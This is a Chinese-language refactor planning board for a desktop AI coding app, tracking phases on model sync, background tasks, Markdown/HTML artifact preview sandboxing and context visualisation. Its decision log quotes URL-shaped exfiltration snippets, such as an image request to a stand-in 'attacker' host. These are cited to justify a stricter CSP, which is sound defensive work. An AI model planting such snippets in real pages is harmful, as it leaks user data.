# Refactor Closeout / 重构收口计划（总控板）

> 创建：2026-05-06 · 最后更新：2026-05-12（Phase 0-4 已完成并归档；Phase 5 待启动）
> 这是日常入口；查历史细节请走"历史归档"列（`completed/refactor-phase-*.md` + `completed/phase-4-markdown-artifact.md`），不要在本文件里翻 1000 行决策日志。
> **协作边界**：Codex 负责计划制定、方案审查和 Review；ClaudeCode 负责执行代码改动、测试和提交整理。除非用户明确重新授权，Codex 只能改 `docs/` 下的计划 / 交接 / review 文档，不再直接改业务代码。

## 当前状态

| 顺序 | 主线 | 用户视角结果 | 状态 | 历史归档 |
|------|------|--------------|------|----------|
| 0 | 计划收敛 | Active 计划只剩本计划 + issue-tracker | ✅ 已完成（2026-05-06） | [phase-1](../completed/refactor-phase-1-models-providers.md) |
| 1 | 模型同步与渠道扩展 | 添加服务商不再被无关模型污染；OpenRouter 走搜索；默认模型不乱跳 | ✅ 主路径完成（catalog 主动核准持续跟踪 tech-debt #16） | [phase-1](../completed/refactor-phase-1-models-providers.md) |
| 2 | Runtime 与会话执行 | 每个会话能解释 / 能切换"执行引擎"；旧会话不被全局漂移；下一条消息生效 | ✅ Step 1-4c 全部完成（2026-05-07） | [phase-2](../completed/refactor-phase-2-runtime-session.md) |
| 3 | 后台常驻、全局定时任务、助理心跳与通知 | 关窗常驻菜单栏；reminder 不依赖 AI；本机通知 / Bridge 解耦；全局任务页；后台 Agent 任务 + 后台心跳 | ✅ 全部完成（2026-05-10）：Step 1-3 + IA 收尾 + Step 4a（任务会话壳 + 文本生成 + 心跳后台化）+ Step 4b（headless streamClaude + waiting_for_permission 可达 + WaitingForPermissionPanel） | [phase-3](../completed/refactor-phase-3-background-tasks-notifications.md) |
| 4 | Markdown / Artifact 稳定与表现层 | Markdown 作为数据层；HTML / Artifact 作为表现层；外部资源、安全沙箱、工程输出引用 | ✅ 全部完成（2026-05-12）：trust tier + html-preview 同源路由 + CSP 4 轮 + Markdown 原地风格 + Artifact code-fence / dev-output。HTML Artifact 显式保存入口 deferred（tech-debt #18） | [phase-4](../completed/phase-4-markdown-artifact.md) |
| 5 | 上下文可视化 | 输入框右下角是组成条而不是单一百分比 | 📋 待开始（详见下方） | — |
| 6 | 视觉锚点与图标体系 | 点阵风格视觉记忆点 + HugeIcons 统一 | 📋 待开始（详见下方） | — |

## 下一步

**Phase 4 整条主线已收口完毕并归档**（trust tier + html-preview 路由 + CSP 4 轮 + Markdown 原地风格 + Artifact code-fence + dev-output；HTML Artifact 显式保存入口 deferred 进 tech-debt #18）。完整交付清单见 [completed/phase-4-markdown-artifact.md](../completed/phase-4-markdown-artifact.md)，技术 / 产品文档分别在 [handover/phase-4-markdown-artifact.md](../../handover/phase-4-markdown-artifact.md) 与 [insights/phase-4-markdown-artifact.md](../../insights/phase-4-markdown-artifact.md)。

下一阶段 **Phase 5：上下文可视化** 待启动（详见下方"Phase 5 方案"）。

### Phase 3 Step 4（完成 2026-05-10）：后台 Agent 任务与助理心跳闭环

Phase 3 Step 4 已拆成两批并全部完成：

- **Step 4a**：任务会话壳、`messages.task_run_id`、`<TaskRunMarker />`、`task_run_logs` 5 态应用层白名单、心跳系统任务、Tasks 页 5 态展示、Assistant 心跳频率。
- **Step 4b**：后台 `runScheduledAgentTask` 切到 headless `streamClaude`，支持真实工具调用、`permission_request → waiting_for_permission`、`<TaskWaitingForPermissionPanel />` 的重跑 / 放弃动作。
- **后续修正**：任务创建时注入 `origin_session_id` / `working_directory`，task-bound session 只复用 `source='task'`，heartbeat 路径硬隔离 MCP / `settingSources`，后台任务失败不再污染最近用户会话。

当前边界：

| 概念 | `kind` | `source` | 行为 |
|---|---|---|---|
| 提醒 | `reminder` | `user` | 到点直接通知，不调用 AI。 |
| 用户创建的 AI 任务 | `ai_task` | `user` | 到点创建 / 复用 task-bound session，走 headless Agent 执行链，结果和工具事件落入任务会话。 |
| 助理心跳 | `ai_task` | `assistant_heartbeat` | 后台按频率检查 `HEARTBEAT.md`；只允许 memory 工具；`HEARTBEAT_OK` 静默，否则写入 buddy session 并通知。 |

剩余明确不做：

- 不做 durable agent state resume；权限请求后只提供重跑 / 放弃，不从断点继续。
- 不做 cron 表达式编辑器、跨 Agent 调度接管、心跳频率低于 1 小时、跨设备同步。
- 不把 task-bound session 放进主聊天列表；只能从 Tasks 页、通知、直接 URL 进入。

Phase 3 验收入口：

- 浏览器主流程：`/settings/tasks` 列表 + 执行记录、`/chat?prefill=...`、模型切换解锁、任务会话 marker / waiting panel。
- Electron 原生 smoke：关窗常驻、菜单栏打开 / 退出、后台通知、通知点击路由到任务页或 task session。
- 自动化：`npm run test`、`npx next build`、`node scripts/build-electron.mjs`。

## 未闭环风险 / TODO

当前 active 总控板无 Phase 1-3 阻塞 TODO。已修问题和历史根因放在对应 phase archive；真正暂缓或产品未排期事项放在下方"暂缓清单"或 `docs/exec-plans/tech-debt-tracker.md`。

## 验收入口

> 把每条主线"在哪个页面 / 命令能验"集中放这里。日常想确认某条是否还在工作，按这里走。

- **Phase 1**：Settings → Providers（添加套餐型服务商不报 discovery 失败）；Settings → Models（OpenRouter 走搜索；套餐型模型不出现 100+ 上游目录）；Chat 新会话默认模型按钮显示 `<provider>·<model>`。
- **Phase 2**：composer 工具栏 `[模式] [对话引擎] [权限]` 三联可见；切 RuntimeSelector → /chat 即时按新 runtime 过滤；删除当前会话 provider → 发送返回 409 INVALID_SESSION_PROVIDER 横幅；切换后 transcript 出现 "已切换执行引擎：X → Y" marker。
- **Phase 3**：创建一个"+1 分钟" reminder（不配 provider）→ 关窗 → 等到点 → macOS 系统通知弹出 → 点通知落到 `Settings → 定时任务` + 焦点该任务 + 展开看到 delivery log；浏览器直接 POST `/api/tasks/schedule` 带 `notify_on_complete: true` 返回 200 + DB row 1。

## 暂缓清单

不主动开工的（用户决议或不在本轮 6 条主线内）：

- Run Checkpoint Round 3（PermissionPrompt 视觉收编，2026-04-30 用户决定）
- 更多 Bridge 渠道（微信 / QQ Bridge — 单独计划在 active）
- 插件市场深度功能、浮窗助理、自动多 Agent 编排
- 全 provider billing / usage API
- Memory 管理面板
- 大规模官网 / 文档站工作

## Phase 4 / 5 / 6 方案

> Phase 4 当前只跟 Markdown / Artifact 有关。Codex Runtime / Local Agent Adapter、OpenClaw / Hermes 兼容、多 Agent 调度等已移出本阶段，后续单独立项，避免和展示层收口互相污染。

### Phase 4：Markdown / Artifact 稳定与表现层

> 进度：**已完成并归档（2026-05-12）**。
>
> 子计划归档于 [`completed/phase-4-markdown-artifact.md`](../completed/phase-4-markdown-artifact.md)；技术交接见 [`handover/phase-4-markdown-artifact.md`](../../handover/phase-4-markdown-artifact.md)，产品思考见 [`insights/phase-4-markdown-artifact.md`](../../insights/phase-4-markdown-artifact.md)。该批次沉淀 Markdown-as-data / HTML-as-presentation 的产品判断、资源安全策略和验收样本。

#### 用户结果

1. Markdown 可以作为可信数据层使用：工作区内文件可编辑，外部文件可只读授权打开，AI / 用户改动后预览会自动刷新，编辑冲突不会被静默覆盖。
2. Markdown 预览不再只是大段文本：frontmatter、heading anchor、wikilink、Obsidian callout、选区加入对话都能直接交互。
3. HTML / Artifact 有明确安全边界：本地相对资源可解析；Static / Interactive 两档沙箱分清楚；Interactive 不允许外联泄漏。
4. 代码块可以一键进入 Artifact：HTML / JSX / JSON / diff / CSV / Markdown 都有对应富预览或安全降级。
5. Markdown 打开即按默认 Article 风格渲染；用户可用 Select 切 Default / Article / Report / Brief / Pitch；切样式原地切 CSS，不弹窗、不写盘。显式的 HTML Artifact 导出入口 deferred（见 tech-debt-tracker #18）。
6. 工程聊天输出里的文件路径、line fragment、diff fence、localhost URL 能变成可点击 chip，不再停留在普通文本。

#### 已完成范围

| 模块 | 当前结果 |
|---|---|
| PreviewSource trust tier | `workspace / user-selected / agent-referenced` 三档；AI 提到外部文件先确认，确认后只读打开。 |
| Markdown 文件刷新 | `codepilot:file-changed` 触发安静刷新；dirty buffer 显示冲突条。 |
| HTML 文件预览 | `/api/files/html-preview/[scope]/...` 同源路由；relative CSS/img/script 按 scope 解析；CSP 从 `default-src 'none'` 起步。 |
| HTML Interactive | 只开放脚本执行，不开放 `allow-same-origin`，并撤销所有 `https:` 外联资源，堵住 URL-shaped exfiltration。 |
| Markdown 数据交互 | frontmatter、wikilink、callout、heading anchor、选区加入对话。 |
| Artifact routing | code-fence Preview action + inline-json / inline-diff / inline-datatable / inline-markdown / inline-html / inline-jsx。 |
| Markdown 表现层 | in-place presentation Select + quiet refresh。HTML Artifact 显式保存入口 deferred（helpers 保留，详见 tech-debt-tracker #18）。 |
| 工程输出引用 | 本地文件 chip、Markdown 链接拦截、bare filename resolution、localhost Browser / Artifact chip。 |

#### 验收入口

- `/chat/<id>` 打开右侧文件树，预览一个 workspace `.md`：默认 Article 样式、Select 原地切换、自动刷新、编辑冲突横幅。显式 Export / Save HTML deferred（tech-debt #18），头部不提供按钮。
- 打开一个 workspace `.html`：相对 CSS / 图片可见；Static / Interactive Select 文案正确；Interactive 下外联被 CSP 阻断。
- 打开一个外部 Markdown / HTML：先出现授权卡；确认后只读打开；同目录静态资源刷新正常。
- 在聊天消息里测试 `README.md:12`、`/abs/path/file.md#L12`、```diff、```json、localhost URL：chip / Preview action 对应正确。
- 自动化：`npm run test`、`npx next build`，涉及 UI 后用 Browser/CDP 做 smoke。

#### 不做

- 不做 Codex Runtime / Local Agent Adapter，不做 `@codex` 入口；这些后续单独计划。
- 不做全 vault 索引、反向链接图、WYSIWYG Markdown 编辑器。
- 不做远端 E2B / Vercel Sandbox 上传执行；当前 HTML/JSX 预览仍本地、安全、显式授权。
- 不让外部只读 Markdown 因为“能预览”就静默写盘；显式 HTML Artifact 导出入口 deferred（tech-debt-tracker #18）。

### Phase 5：上下文可视化

- **用户结果**：输入框右下角不只是百分比，而是组成条——历史 / 输入 / 附件 / 系统提示 / Memory 各占多少。上下文快满时知道删什么。
- **要做**：在现有 token estimate 上拆来源；Run 状态面板显示组成条 + 明细；Context chips / attachments / directory refs 共用同一估算数据；缺 model context length 时显"容量未知"但仍展示相对大小。
- **不做**：第一版 token 精确到账单级；为可视化重写 context assembler。

### Phase 6：视觉锚点与图标体系

- **用户结果**：点阵风格视觉记忆点（loading / 空状态 / 背景纹理）；图标统一到 HugeIcons。
- **要做**：先做视觉资产 + icon audit；HugeIcons 统一封装；点阵风格只在 3 个低风险位置试点；CDP 截图确认。
- **不做**：一口气全局重做 UI；点阵铺满所有卡片。

## 最近决策（最近 8 条）

> 完整决策日志按 Phase 归档，见 `completed/refactor-phase-*.md` + `completed/phase-4-markdown-artifact.md`。本节只保留当前收口状态，避免 active 总控板携带过期口径。

- 2026-05-12：**Phase 4 Markdown / Artifact 主线实现并校正口径**。当前阶段只覆盖 Markdown 数据层、HTML/Artifact 表现层、工程输出引用；显式 HTML Artifact 导出入口 deferred（tech-debt #18）。Codex Runtime / Local Agent Adapter 已从 Phase 4 剥离，后续另开独立计划。
  - Markdown 表现层从“生成弹窗”改为默认 Article + Select 直接切换；显式 HTML Artifact 导出入口 deferred — 第一轮把按钮放在 PreviewPanel 头部 + `.codepilot/artifacts/<slug>.html`，用户两次反馈反对（路径错位 / header 拥挤 / Style Select 已能原地呈现 HTML 形态）。helpers 保留作未来 Export pipeline 脚手架；tech-debt-tracker #18 记录重启条件。
  - 工程输出格式适配只处理 path/line/diff/localhost 这些展示引用，不绑定任何具体 Runtime。
- 2026-05-11：**Phase 4 Step 1 部分落地：Markdown 跨工作区授权 + HTML 外部资源解析（两段）**。
  - Phase 1 = `PreviewSource.trust = workspace / user-selected / agent-referenced` + 确认卡 + `codepilot:file-changed` 自动刷新 + 编辑冲突保护。MultiEdit 入 WRITE_TOOLS；openDynamicTab 同 id 替换 metadata 让 trust 升级跨刷新持久化。
  - Phase 1.5 Round 1（**local relative resources done**）= 同源 route `/api/files/html-preview/[scope]/<abs-path>`，scope 编码进 path segment 让 browser-native relative 解析自动保持 scope；iframe `src=` 替代 `srcDoc`；脚本默认禁；inline-html 无来源仍 strict srcDoc。
  - Phase 1.5 Round 2（**remote https static + blocked-resource policy + dep reload done**）= 路由 CSP 拆 Static / Interactive 两档，Static 放开 `https:` 给 img/style/font/media、`script-src 'none'`；Interactive 额外放开 `script-src https:`，`allow-same-origin` 永不开。PreviewPanel header 永久显示模式徽章 + tooltip（不靠 console 给 blocked 反馈）。`codepilot:file-changed` 对 HTML 预览扩展 sibling-dep 匹配：同 scope baseDir 下的静态资源族变更触发 reload nonce → iframe `src` 变化 → 浏览器重 fetch 全部 subresource。
  - Phase 1.5 Round 3（**CSP egress lockdown + user-selected dep reload done**）= CSP 改 `default-src 'none'` + 显式放允许方向；两档都强制 `connect/frame/object/worker/manifest-src 'none'`，防止 Interactive 模式下脚本通过 fetch / nested iframe / Worker 把预览内容外传；user-selected 外部 HTML 的依赖刷新改用 `htmlPreviewDirname(filePath)` 作为 scope floor（不再因 sourceBaseDir undefined 默默跳过外部 HTML 的 sibling 刷新）。
  - Phase 1.5 Round 4（**Interactive URL-shaped exfiltration closed**）= Round 3 漏了一类通道：Interactive 模式下脚本可以 `new Image().src = 'https://attacker/?d=...'` / `<link rel=stylesheet href=https://...>` / `<script src=https://...>` 把预览内容塞进 URL 外发，这些不走 connect-src 走 img/style/script-src 的 https。Round 4 把 Interactive 模式下所有资源 directive 的 `https:` 全部撤销（script + img + style + font + media），只保留 `'self' data: blob:`。Static 模式不变。产品语义切成两个独立信任决定：「让脚本运行」与「让外部 CDN 资源加载」，后者未来独立 UI 开关。
  - Step 1 余下：长 Markdown 截断空白、`PreviewSource` 生命周期收口、JSX/CSV 失败可读化、DiffSummary 按钮可见性对齐。
- 2026-05-11：**Phase 4 计划 v3 写入（已被 2026-05-12 口径修正覆盖）**。早期把 Local Agent Adapter 与 Markdown / Artifact 放在同一阶段；后续确认这会干扰当前展示层收口，已拆出。
- 2026-05-10：**Phase 3 Step 4b 完成**。后台 `runScheduledAgentTask` 切到 headless `streamClaude`；支持真实工具调用、`permission_request → waiting_for_permission`、任务会话 marker、重跑 / 放弃面板。
- 2026-05-10：**任务来源上下文修复**。`codepilot_schedule_task` 注入 `origin_session_id` / `working_directory`；task-bound session 继承 origin 的 cwd / provider / model / runtime，不再落到助理最新会话。
- 2026-05-10：**heartbeat 后台纪律收紧**。前台打开页面不再触发心跳；scheduler 按间隔后台执行；heartbeat 模式只允许 memory 工具，屏蔽 MCP / shell / web / ambient settings。
- 2026-05-10：**右栏产品决策反向**。File tree 与 Workspace sidebar 从互斥改为可叠加，两个按钮只切换各自面板。
- 2026-05-10：**Assistant 页 IA 收口**。Assistant 设置页不再展示任务列表入口；全局任务管理统一在 `/settings/tasks`。
- 2026-05-10：**复制 ID 与 prefill 修复**。复制对话 ID 统一走 `copyWithToast`；`/chat?prefill=...` 支持 warm navigation 回填。
- 2026-05-10：**delivery log 修复**。`sendNotification` 返回 `deliveries[].error`，任务执行记录能展示 channel 失败原因。

## 审批原则（保留）

每一阶段开工前必须回答三件事：

1. **用户结果**：用户打开产品后会看到什么变化，哪些旧困惑会消失。
2. **验收路径**：用哪个页面、哪个按钮、哪个流程可以验证。
3. **不做什么**：本阶段明确不碰哪些诱人的支线。

如果一个任务只能描述成"改某个模块 / 抽某个接口"，但说不清用户会看到什么，就不能作为独立阶段开工。

## 文档拆分历史

- 2026-05-10：把 active/refactor-closeout.md 从 1000+ 行收口为总控板；Phase 0+1 / Phase 2 / Phase 3 的完整计划与决策日志归档到 `completed/`。
- 2026-05-11：Phase 4 计划 v3 写入 active 总控板，随后在 2026-05-12 校正为 Markdown / Artifact 专项；Local Agent / Runtime 接入从本阶段剥离，后续另开计划。
